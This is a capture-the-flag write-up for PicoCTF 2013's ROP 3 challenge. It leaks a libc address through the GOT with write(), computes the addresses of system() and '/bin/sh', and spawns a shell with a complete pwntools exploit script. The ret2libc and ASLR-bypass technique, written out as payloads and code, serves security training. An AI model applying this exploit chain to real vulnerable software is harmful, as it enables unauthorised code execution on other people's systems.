# PicoCTF 2013: ROP 3

**Category:** Binary Exploitation
**Points:** 150
**Description:**

> ROP is a classic technique for getting around address randomization and
> non-executable memory. This sequence will teach you the basics.
>
> Problem available on the shell machine in /problems/ROP_3_7f3312fe43c46d26,
> downloadable [here](https://2013.picoctf.com/problems/rop3-7f3312fe43c46d26) with source [here](://2013.picoctf.com/problems/rop3-7f3312fe43c46d26.c).
>
>

## Write-up
**DISCLAIMER: Many of the other writeups for this online used ulimit to disable
ASLR during their session. This makes the problem exceptionally easy. My
writeup will show how to solve it the hard way, since you're likely using this
for practice. It is also only a local solution since I don't think you can
install pwntools on the PicoCTF server.**

Just like ROP 1 and ROP 2, RIP Shellcode.

This one's going to be a bit harder. If you haven't read my bit on the GOT and
PLT from [ROP 2](../rop-2) then you should do that :)

looking at the code, we can see there isn't anything extra for us to work with.
```C
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function()  {
    char buf[128];
    read(STDIN_FILENO, buf,256);
}

void be_nice_to_people() {
    // /bin/sh is usually symlinked to bash, which usually drops privs. Make
    // sure we don't drop privs if we exec bash, (ie if we call system()).
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char** argv) {
        be_nice_to_people();
    vulnerable_function();
    write(STDOUT_FILENO, "Hello, World\n", 13);
}
```

This challenge actually requires us to **bypass ASLR** as opposed to calling
premade functions. `system()` isn't called in this program, so there isn't a PLT
stub for it :(. Luckily, bypassing ASLR is only mildly painful.

We'll start by finding the offset for `$eip`.
```
python -c 'print "A"*140 + "BBBB"' | strace ./rop3-7f3312fe43c46d26
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
```
140 bytes, just like the other ROP problems so far. Now comes the fun part. You
know that the GOT contains the pointers into libc for the binary to use. What
you may not have known is that the GOT is writable. You can change values in
the GOT that correspond to PLT stubs. If you were able to change a pointer by a
certain am.ount and then call the corresponding PLT stub, you could trick the
program into calling `system()`. We can run objdump to find what PLT/GOT
functions we have to work with.

```
$ objdump -d rop3-7f3312fe43c46d26 | grep ">:"
08048360 <read@plt>:
...
...
080483a0 <write@plt>:
```

Unfortunately those are about the only two useful functions we have, but
they'll be enough. In addition, we'll need the address of functions in the GOT
for us to leak.

```
$ objdump -R rop3-7f3312fe43c46d26

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   read
0804a004 R_386_JUMP_SLOT   getegid
0804a008 R_386_JUMP_SLOT   __gmon_start__
0804a00c R_386_JUMP_SLOT   __libc_start_main
0804a010 R_386_JUMP_SLOT   write
0804a014 R_386_JUMP_SLOT   setresgid
```
Our first vector of attack will be to call `write()` and print out an address
from the GOT like so:

`write(1,address_read_GOT,4)`

```
python -c 'print "A"*140 + "\xa0\x83\x04\x08" + "AAAA" + "\x01\x00\x00\x00" +
"\x00\xa0\x04\x08" + "\x04\x00\x00\x00"' | ./rop3-7f3312fe43c46d26
```

The "AAAA" in the exploit is the return address, we'll get to that later. If
you run this, you'll get a little bit of gibberish to print out and then a
segfault. That gibberish is the libc address of `read()` for that runtime.
Time for good ol' gdb:

```
$ gdb rop3-7f3312fe43c46d26
gdb-peda$ b*main
gdb-peda$ r

```
Your results may vary from here on.
```
db-peda$ p read
$1 = {<text variable, no debug info>} 0xf7efdbd0 <read>
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0xf7e63190 <system>
gdb-peda$ p 0xf7efdbd0-0xf7e63190
$3 = 0x9aa40
```
Address of `system()` is **lower** than `read()` by 0x9aa40
```
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f83a24 ("/bin/sh")
gdb-peda$ p 0xf7f83a24-0xf7efdbd0
$5 = 0x85e54
```
Address of /bin/sh is **greater** than `read()` by 0x85e54.
Now we need to change the "AAAA" in our exploit to the address of
`vulnerable_function()`. This will retrigger the vulnerability, enabling us to
calculate the address of 'system()' and "/bin/sh" and make the appropriate
function call.
```
python -c 'print "A"*140 + "\xa0\x83\x04\x08" + "\x74\x84\x04\x08" + "\x01\x00\x00\x00" +
"\x00\xa0\x04\x08" + "\x04\x00\x00\x00"' | ./rop3-7f3312fe43c46d26
```

At this point, we'll need to use pwntools. You can install it with:
```
sudo pip install pwntools
```

Here's why. Once we have that leaked address we can do some napkin math to
calculate the address of `system()`. **ASLR only randomises the base address of
libc. This means that `system()` is always the same distance from `read()` or
`write()` at any given runtime**. pwntools can do that math for us. We can
start our python script as such:
```python

from pwn import *
context(arch='i386', os='linux')
#conventions for pwntools ^

first_part = ("A"*140 + "\xa0\x83\x04\x08" + "\x74\x84\x04\x08"
+ "\x01\x00\x00\x00" + "\x00\xa0\x04\x08" + "\x04\x00\x00\x00" )
# our exploit so far ^
r = process("./rop3-7f3312fe43c46d26", shell=True) #executes the binary
r.sendline(first_part ) #feeds the exploit to the binary
a=unpack(r.recv(4)) #gets the four bytes we leaked from the GOT
print hex(a)
```
if you run this a few times the address should vary from run to run.
This is a good thing, it means that you're getting the random libc address.
From here, you can calculate the addresses we found before in gdb by adding
these lines.
```python
system_address=a-0x9aa40
binsh_address = a+0x85e54

r.sendline("A"*140+pack(system_address)+"JUNK"+pack(binsh_address))

""" The above line sends 140 bytes of padding, the little endian form of
    system_address, a bogus return address, and the little endian form of the
    address of /bin/sh. The pack() function just turns the integer into an escape
    sequence for us
"""
r.interactive() # This just enables you to type things in to your shell :)
```

pwned.
## Other write-ups and resources

* none yet
